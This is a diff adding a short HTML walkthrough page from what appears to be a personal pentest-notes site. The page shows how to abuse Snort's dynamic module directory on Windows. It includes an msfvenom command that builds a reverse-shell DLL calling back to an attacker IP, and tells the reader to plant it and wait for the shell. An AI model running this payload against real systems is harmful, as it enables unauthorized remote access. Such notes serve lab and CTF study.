@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Snort</h1>
+            <p>An open-source network intrusion detection system that analyzes network traffic in real-time to identify malicious activity and potential attacks</p>
+       
+        </div>
+        <div class="notion-body">
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Malicious DLL execution</h3>
+                <p>In snort manual we can find a section called <b>Dynamic Modules</b> which are snipets of called in form of DLL that are executed by snort</p>
+                <p>This can be found in <b>snort.conf</b></p>
+                <pre><code class="language-bash">type snort.conf | findstr dynamicpreprocessor</code></pre>
+                <p>This will output the location of where this dynamic modules can be found, typically</p>
+                <pre><code class="language-bash">C:\Snort\lib\snort_dynamicengine\</code></pre>
+                <p>Proceed, to create a malicious payload</p>
+                <pre><code class="language-bash"> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f dll -a x64 -o reverse.dll</code></pre>
+                <p>Upload payload, place it to that path and wait for the reverse shell :)</p>
+            </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
